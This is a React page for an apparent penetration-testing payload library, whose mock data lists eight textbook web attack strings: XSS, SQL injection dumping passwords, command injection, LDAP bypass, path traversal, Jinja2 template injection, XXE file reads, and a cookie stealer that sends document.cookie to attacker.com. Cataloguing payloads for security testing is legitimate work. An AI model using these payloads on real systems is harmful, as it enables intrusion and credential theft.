import { useState } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { AttackNoteSpace } from "@/components/ui/attack-note-space";
import { 
  Bug, 
  Plus, 
  Search, 
  MoreVertical,
  Edit,
  Trash2,
  Copy,
  Download,
  Code,
  Target,
  Settings
} from "lucide-react";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu";

// Mock data for payloads
const mockPayloads = [
  {
    id: "1",
    name: "Basic XSS Alert Payload",
    type: "XSS",
    category: "Cross-Site Scripting",
    payload: "<script>alert('XSS')</script>",
    description: "Simple XSS payload to test for cross-site scripting vulnerabilities",
    platform: "Web",
    encoding: "None",
    success_rate: "High",
    tags: ["xss", "basic", "alert", "javascript"]
  },
  {
    id: "2", 
    name: "SQL Injection Union Select",
    type: "SQLi",
    category: "Injection",
    payload: "' UNION SELECT null,username,password,null FROM users--",
    description: "Union-based SQL injection payload for MySQL databases",
    platform: "Web",
    encoding: "None", 
    success_rate: "Medium",
    tags: ["sql", "union", "mysql", "injection"]
  },
  {
    id: "3",
    name: "Command Injection via Ping",
    type: "Command Injection",
    category: "Injection",
    payload: "127.0.0.1; cat /etc/passwd",
    description: "Command injection payload using semicolon separator",
    platform: "Linux",
    encoding: "None",
    success_rate: "Medium",
    tags: ["command-injection", "linux", "cat", "passwd"]
  },
  {
    id: "4",
    name: "LDAP Injection Authentication Bypass",
    type: "LDAP Injection",
    category: "Injection",
    payload: "admin)(&(password=*))",
    description: "LDAP injection payload to bypass authentication",
    platform: "Web",
    encoding: "None",
    success_rate: "Low",
    tags: ["ldap", "authentication", "bypass", "injection"]
  },
  {
    id: "5",
    name: "XSS Cookie Stealer",
    type: "XSS",
    category: "Cross-Site Scripting", 
    payload: "<img src=x onerror='fetch(\"https://attacker.com/?c=\"+document.cookie)'>",
    description: "XSS payload to steal cookies using img onerror event",
    platform: "Web",
    encoding: "None",
    success_rate: "High",
    tags: ["xss", "cookie-theft", "img", "onerror"]
  },
  {
    id: "6",
    name: "Directory Traversal Linux",
    type: "Path Traversal",
    category: "Directory Traversal",
    payload: "../../../../etc/passwd%00",
    description: "Directory traversal payload with null byte termination",
    platform: "Linux",
    encoding: "URL",
    success_rate: "Medium",
    tags: ["traversal", "linux", "null-byte", "passwd"]
  },
  {
    id: "7",
    name: "Server-Side Template Injection (Jinja2)",
    type: "SSTI",
    category: "Template Injection",
    payload: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
    description: "SSTI payload for Jinja2 template engine to execute commands",
    platform: "Python",
    encoding: "None",
    success_rate: "High",
    tags: ["ssti", "jinja2", "python", "rce"]
  },
  {
    id: "8",
    name: "XXE External Entity",
    type: "XXE",
    category: "XML External Entity",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
    description: "XXE payload to read local files through XML external entity",
    platform: "Web",
    encoding: "None",
    success_rate: "Medium",
    tags: ["xxe", "xml", "external-entity", "file-read"]
  }
];

const typeColors = {
  "XSS": "bg-orange-100 text-orange-800 border-orange-200",
  "SQLi": "bg-red-100 text-red-800 border-red-200",
  "Command Injection": "bg-purple-100 text-purple-800 border-purple-200",
  "LDAP Injection": "bg-blue-100 text-blue-800 border-blue-200",
  "Path Traversal": "bg-yellow-100 text-yellow-800 border-yellow-200",
  "SSTI": "bg-green-100 text-green-800 border-green-200",
  "XXE": "bg-pink-100 text-pink-800 border-pink-200"
};

const successRateColors = {
  "High": "text-green-600",
  "Medium": "text-yellow-600", 
  "Low": "text-red-600"
};

export default function PayloadsPage() {
  const [searchTerm, setSearchTerm] = useState("");
  const [typeFilter, setTypeFilter] = useState<string>("all");
  const [platformFilter, setPlatformFilter] = useState<string>("all");
  const [isCreateDialogOpen, setIsCreateDialogOpen] = useState(false);
  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);
  const [payloadInNoteSpace, setPayloadInNoteSpace] = useState<any>(null);
  const [editingPayload, setEditingPayload] = useState<any>(null);
  const [newPayload, setNewPayload] = useState({
    name: "",
    payload: "",
    description: "",
    vulnerabilityClassId: "",
    techniqueId: "",
    encoding: "None",
    success_rate: "Medium",
    tags: ""
  });

  const filteredPayloads = mockPayloads.filter(payload => {
    const matchesSearch = payload.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         payload.payload.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         payload.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         payload.tags.some(tag => tag.toLowerCase().includes(searchTerm.toLowerCase()));
    const matchesType = typeFilter === "all" || payload.type === typeFilter;
    const matchesPlatform = platformFilter === "all" || payload.platform === platformFilter;
    return matchesSearch && matchesType && matchesPlatform;
  });

  const handleCreatePayload = () => {
    console.log("Creating payload:", newPayload);
    // In real implementation, this would make an API call
    mockPayloads.push({
      id: (mockPayloads.length + 1).toString(),
      ...newPayload,
      tags: newPayload.tags.split(',').map(t => t.trim()).filter(Boolean)
    });
    setIsCreateDialogOpen(false);
    setNewPayload({
      name: "",
      payload: "",
      description: "",
      vulnerabilityClassId: "",
      techniqueId: "",
      encoding: "None",
      success_rate: "Medium",
      tags: ""
    });
  };

  const handleEditPayload = (payload: any) => {
    setEditingPayload({ ...payload, tags: payload.tags.join(', ') });
    setIsEditDialogOpen(true);
  };

  const handleUpdatePayload = () => {
    console.log("Updating payload:", editingPayload);
    // In real implementation, this would make an API call
    const index = mockPayloads.findIndex(p => p.id === editingPayload.id);
    if (index !== -1) {
      mockPayloads[index] = {
        ...editingPayload,
        tags: editingPayload.tags.split(',').map((t: string) => t.trim()).filter(Boolean)
      };
    }
    setIsEditDialogOpen(false);
    setEditingPayload(null);
  };

  const handleDeletePayload = (payloadId: string) => {
    if (window.confirm('Are you sure you want to delete this payload?')) {
      console.log("Deleting payload:", payloadId);
      // In real implementation, this would make an API call
      const index = mockPayloads.findIndex(p => p.id === payloadId);
      if (index !== -1) {
        mockPayloads.splice(index, 1);
      }
    }
  };

  const handleOpenNoteSpace = (payload: any) => {
    setPayloadInNoteSpace(payload);
  };

  const handleSaveInNoteSpace = (updatedPayload: any) => {
    console.log("Saving in note space:", updatedPayload);
    // In real implementation, this would make an API call
    const index = mockPayloads.findIndex(p => p.id === updatedPayload.id);
    if (index !== -1) {
      mockPayloads[index] = updatedPayload;
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const exportPayload = (payload: any) => {
    const data = JSON.stringify(payload, null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${payload.name.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const types = [...new Set(mockPayloads.map(p => p.type))];
  const platforms = [...new Set(mockPayloads.map(p => p.platform))];

  return (
    <div className="flex flex-col space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">Payloads</h1>
          <p className="text-muted-foreground">
            Manage your collection of attack payloads and exploits
          </p>
        </div>
        
        <Dialog open={isCreateDialogOpen} onOpenChange={setIsCreateDialogOpen}>
          <DialogTrigger asChild>
            <Button>
              <Plus className="mr-2 h-4 w-4" />
              New Payload
            </Button>
          </DialogTrigger>
          <DialogContent className="sm:max-w-[600px]">
            <DialogHeader>
              <DialogTitle>Add New Payload</DialogTitle>
              <DialogDescription>
                Add a new attack payload or exploit to your collection.
              </DialogDescription>
            </DialogHeader>
            <div className="grid gap-4 py-4">
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="name" className="text-right">Name</Label>
                <Input
                  id="name"
                  value={newPayload.name}
                  onChange={(e) => setNewPayload({ ...newPayload, name: e.target.value })}
                  className="col-span-3"
                  placeholder="Payload name"
                />
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="vulnerabilityClassId" className="text-right">Vulnerability Class</Label>
                <Input
                  id="vulnerabilityClassId"
                  value={newPayload.vulnerabilityClassId}
                  onChange={(e) => setNewPayload({ ...newPayload, vulnerabilityClassId: e.target.value })}
                  className="col-span-3"
                  placeholder="Associated vulnerability class ID"
                />
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="techniqueId" className="text-right">Technique</Label>
                <Input
                  id="techniqueId"
                  value={newPayload.techniqueId}
                  onChange={(e) => setNewPayload({ ...newPayload, techniqueId: e.target.value })}
                  className="col-span-3"
                  placeholder="Associated technique ID"
                />
              </div>
              <div className="grid grid-cols-4 items-start gap-4">
                <Label htmlFor="payload" className="text-right pt-2">Payload</Label>
                <Textarea
                  id="payload"
                  value={newPayload.payload}
                  onChange={(e) => setNewPayload({ ...newPayload, payload: e.target.value })}
                  className="col-span-3"
                  placeholder="The actual payload code"
                  rows={4}
                />
              </div>
              <div className="grid grid-cols-4 items-start gap-4">
                <Label htmlFor="description" className="text-right pt-2">Description</Label>
                <Textarea
                  id="description"
                  value={newPayload.description}
                  onChange={(e) => setNewPayload({ ...newPayload, description: e.target.value })}
                  className="col-span-3"
                  placeholder="Describe the payload and its use case"
                  rows={3}
                />
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="encoding" className="text-right">Encoding</Label>
                <Select value={newPayload.encoding} onValueChange={(value) => setNewPayload({ ...newPayload, encoding: value })}>
                  <SelectTrigger className="col-span-3">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="None">None</SelectItem>
                    <SelectItem value="URL">URL Encoded</SelectItem>
                    <SelectItem value="HTML">HTML Encoded</SelectItem>
                    <SelectItem value="Base64">Base64</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="success_rate" className="text-right">Success Rate</Label>
                <Select value={newPayload.success_rate} onValueChange={(value) => setNewPayload({ ...newPayload, success_rate: value })}>
                  <SelectTrigger className="col-span-3">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="Low">Low</SelectItem>
                    <SelectItem value="Medium">Medium</SelectItem>
                    <SelectItem value="High">High</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="grid grid-cols-4 items-center gap-4">
                <Label htmlFor="tags" className="text-right">Tags</Label>
                <Input
                  id="tags"
                  value={newPayload.tags}
                  onChange={(e) => setNewPayload({ ...newPayload, tags: e.target.value })}
                  className="col-span-3"
                  placeholder="xss, injection, rce (comma separated)"
                />
              </div>
            </div>
            <DialogFooter>
              <Button type="submit" onClick={handleCreatePayload}>
                Add Payload
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        {/* Edit Dialog */}
        <Dialog open={isEditDialogOpen} onOpenChange={setIsEditDialogOpen}>
          <DialogContent className="sm:max-w-[600px] max-h-[80vh] overflow-y-auto">
            <DialogHeader>
              <DialogTitle>Edit Payload</DialogTitle>
              <DialogDescription>
                Update the payload details.
              </DialogDescription>
            </DialogHeader>
            {editingPayload && (
              <div className="grid gap-4 py-4">
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-name" className="text-right">Name</Label>
                  <Input
                    id="edit-name"
                    value={editingPayload.name}
                    onChange={(e) => setEditingPayload({ ...editingPayload, name: e.target.value })}
                    className="col-span-3"
                    placeholder="Payload name"
                  />
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-type" className="text-right">Type</Label>
                  <Input
                    id="edit-type"
                    value={editingPayload.type}
                    onChange={(e) => setEditingPayload({ ...editingPayload, type: e.target.value })}
                    className="col-span-3"
                    placeholder="e.g., XSS, SQLi, SSTI"
                  />
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-category" className="text-right">Category</Label>
                  <Input
                    id="edit-category"
                    value={editingPayload.category}
                    onChange={(e) => setEditingPayload({ ...editingPayload, category: e.target.value })}
                    className="col-span-3"
                    placeholder="e.g., Cross-Site Scripting"
                  />
                </div>
                <div className="grid grid-cols-4 items-start gap-4">
                  <Label htmlFor="edit-payload" className="text-right pt-2">Payload</Label>
                  <Textarea
                    id="edit-payload"
                    value={editingPayload.payload}
                    onChange={(e) => setEditingPayload({ ...editingPayload, payload: e.target.value })}
                    className="col-span-3"
                    placeholder="The actual payload code"
                    rows={4}
                  />
                </div>
                <div className="grid grid-cols-4 items-start gap-4">
                  <Label htmlFor="edit-description" className="text-right pt-2">Description</Label>
                  <Textarea
                    id="edit-description"
                    value={editingPayload.description}
                    onChange={(e) => setEditingPayload({ ...editingPayload, description: e.target.value })}
                    className="col-span-3"
                    placeholder="Describe the payload and its use case"
                    rows={3}
                  />
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-platform" className="text-right">Platform</Label>
                  <Input
                    id="edit-platform"
                    value={editingPayload.platform}
                    onChange={(e) => setEditingPayload({ ...editingPayload, platform: e.target.value })}
                    className="col-span-3"
                    placeholder="e.g., Web, Linux, Windows"
                  />
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-encoding" className="text-right">Encoding</Label>
                  <Select value={editingPayload.encoding} onValueChange={(value) => setEditingPayload({ ...editingPayload, encoding: value })}>
                    <SelectTrigger className="col-span-3">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="None">None</SelectItem>
                      <SelectItem value="URL">URL Encoded</SelectItem>
                      <SelectItem value="HTML">HTML Encoded</SelectItem>
                      <SelectItem value="Base64">Base64</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-success_rate" className="text-right">Success Rate</Label>
                  <Select value={editingPayload.success_rate} onValueChange={(value) => setEditingPayload({ ...editingPayload, success_rate: value })}>
                    <SelectTrigger className="col-span-3">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="Low">Low</SelectItem>
                      <SelectItem value="Medium">Medium</SelectItem>
                      <SelectItem value="High">High</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="grid grid-cols-4 items-center gap-4">
                  <Label htmlFor="edit-tags" className="text-right">Tags</Label>
                  <Input
                    id="edit-tags"
                    value={editingPayload.tags}
                    onChange={(e) => setEditingPayload({ ...editingPayload, tags: e.target.value })}
                    className="col-span-3"
                    placeholder="xss, injection, rce (comma separated)"
                  />
                </div>
              </div>
            )}
            <DialogFooter>
              <Button type="submit" onClick={handleUpdatePayload}>
                Update Payload
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>

      <div className="flex items-center space-x-4">
        <div className="relative flex-1">
          <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Search payloads..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-8"
          />
        </div>
        <Select value={typeFilter} onValueChange={setTypeFilter}>
          <SelectTrigger className="w-[140px]">
            <SelectValue placeholder="All Types" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Types</SelectItem>
            {types.map(type => (
              <SelectItem key={type} value={type}>{type}</SelectItem>
            ))}
          </SelectContent>
        </Select>
        <Select value={platformFilter} onValueChange={setPlatformFilter}>
          <SelectTrigger className="w-[140px]">
            <SelectValue placeholder="All Platforms" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Platforms</SelectItem>
            {platforms.map(platform => (
              <SelectItem key={platform} value={platform}>{platform}</SelectItem>
            ))}
          </SelectContent>
        </Select>
      </div>

      <Card>
        <CardHeader>
          <CardTitle>Payload Collection</CardTitle>
          <CardDescription>
            {filteredPayloads.length} payload{filteredPayloads.length !== 1 ? 's' : ''} available
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Name</TableHead>
                <TableHead>Type</TableHead>
                <TableHead>Platform</TableHead>
                <TableHead>Success Rate</TableHead>
                <TableHead>Encoding</TableHead>
                <TableHead className="text-right">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredPayloads.map((payload) => (
                <TableRow key={payload.id}>
                  <TableCell>
                    <div className="max-w-[250px]">
                      <div className="font-medium truncate">{payload.name}</div>
                      <div className="text-sm text-muted-foreground truncate">{payload.description}</div>
                    </div>
                  </TableCell>
                  <TableCell>
                    <Badge variant="outline" className={typeColors[payload.type]}>
                      {payload.type}
                    </Badge>
                  </TableCell>
                  <TableCell>
                    <Badge variant="secondary">{payload.platform}</Badge>
                  </TableCell>
                  <TableCell>
                    <span className={`font-medium ${successRateColors[payload.success_rate]}`}>
                      {payload.success_rate}
                    </span>
                  </TableCell>
                  <TableCell>
                    <Badge variant="outline">{payload.encoding}</Badge>
                  </TableCell>
                  <TableCell className="text-right">
                    <div className="flex items-center justify-end space-x-1">
                      <Button variant="ghost" size="sm" onClick={() => copyToClipboard(payload.payload)}>
                        <Copy className="h-4 w-4" />
                      </Button>
                      <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                          <Button variant="ghost" size="sm">
                            <MoreVertical className="h-4 w-4" />
                          </Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent align="end">
                          <DropdownMenuItem onClick={() => copyToClipboard(payload.payload)}>
                            <Copy className="mr-2 h-4 w-4" />
                            Copy Payload
                          </DropdownMenuItem>
                          <DropdownMenuItem onClick={() => exportPayload(payload)}>
                            <Download className="mr-2 h-4 w-4" />
                            Export
                          </DropdownMenuItem>
                          <DropdownMenuItem onClick={() => handleOpenNoteSpace(payload)}>
                            <Settings className="mr-2 h-4 w-4" />
                            Open Note Space
                          </DropdownMenuItem>
                          <DropdownMenuItem onClick={() => handleEditPayload(payload)}>
                            <Edit className="mr-2 h-4 w-4" />
                            Edit Details
                          </DropdownMenuItem>
                          <DropdownMenuItem className="text-destructive" onClick={() => handleDeletePayload(payload.id)}>
                            <Trash2 className="mr-2 h-4 w-4" />
                            Delete
                          </DropdownMenuItem>
                        </DropdownMenuContent>
                      </DropdownMenu>
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>

      {filteredPayloads.length === 0 && (
        <div className="text-center py-12">
          <Bug className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
          <h3 className="text-lg font-semibold mb-2">No payloads found</h3>
          <p className="text-muted-foreground mb-4">
            {searchTerm || typeFilter !== "all" || platformFilter !== "all"
              ? "Try adjusting your search or filter criteria." 
              : "Get started by adding your first payload."}
          </p>
          {!searchTerm && typeFilter === "all" && platformFilter === "all" && (
            <Button onClick={() => setIsCreateDialogOpen(true)}>
              <Plus className="mr-2 h-4 w-4" />
              Add Payload
            </Button>
          )}
        </div>
      )}

      {/* Attack Note Space */}
      {payloadInNoteSpace && (
        <AttackNoteSpace
          entity={payloadInNoteSpace}
          entityType="payload"
          onSave={handleSaveInNoteSpace}
          onClose={() => setPayloadInNoteSpace(null)}
          showLeftSidebar={true}
          showRightSidebar={true}
          leftSidebarTitle="Target Systems"
          rightSidebarTitle="Related Techniques"
          leftSidebarContent={
            <div className="space-y-4">
              <div>
                <h4 className="font-medium text-sm mb-2">Vulnerable Systems</h4>
                <div className="space-y-2">
                  <Button variant="outline" size="sm" className="w-full justify-start">
                    <Plus className="h-3 w-3 mr-2" />
                    Add Target System
                  </Button>
                  <div className="space-y-1">
                    <Badge variant="secondary" className="text-xs">WordPress</Badge>
                    <Badge variant="secondary" className="text-xs">Drupal</Badge>
                    <Badge variant="secondary" className="text-xs">Custom PHP</Badge>
                  </div>
                </div>
              </div>
              <div>
                <h4 className="font-medium text-sm mb-2">Prerequisites</h4>
                <div className="space-y-2">
                  <Button variant="outline" size="sm" className="w-full justify-start">
                    <Plus className="h-3 w-3 mr-2" />
                    Add Prerequisite
                  </Button>
                  <div className="space-y-1">
                    <Badge variant="outline" className="text-xs">Reflected Input</Badge>
                    <Badge variant="outline" className="text-xs">User Context</Badge>
                  </div>
                </div>
              </div>
            </div>
          }
          rightSidebarContent={
            <div className="space-y-4">
              <div>
                <h4 className="font-medium text-sm mb-2">Associated Techniques</h4>
                <div className="space-y-2">
                  <Button variant="outline" size="sm" className="w-full justify-start">
                    <Plus className="h-3 w-3 mr-2" />
                    Link Technique
                  </Button>
                  <div className="space-y-1">
                    <Badge variant="secondary" className="text-xs">DOM Manipulation</Badge>
                    <Badge variant="secondary" className="text-xs">Event Handling</Badge>
                  </div>
                </div>
              </div>
              <div>
                <h4 className="font-medium text-sm mb-2">Variations</h4>
                <div className="space-y-2">
                  <Card className="p-2">
                    <p className="text-xs">Encoded Version</p>
                    <Button variant="ghost" size="sm" className="h-6 w-full mt-1">
                      <Code className="h-3 w-3 mr-1" />
                      View
                    </Button>
                  </Card>
                  <Card className="p-2">
                    <p className="text-xs">Bypass Filters</p>
                    <Button variant="ghost" size="sm" className="h-6 w-full mt-1">
                      <Target className="h-3 w-3 mr-1" />
                      View
                    </Button>
                  </Card>
                </div>
              </div>
            </div>
          }
        />
      )}
    </div>
  );
}
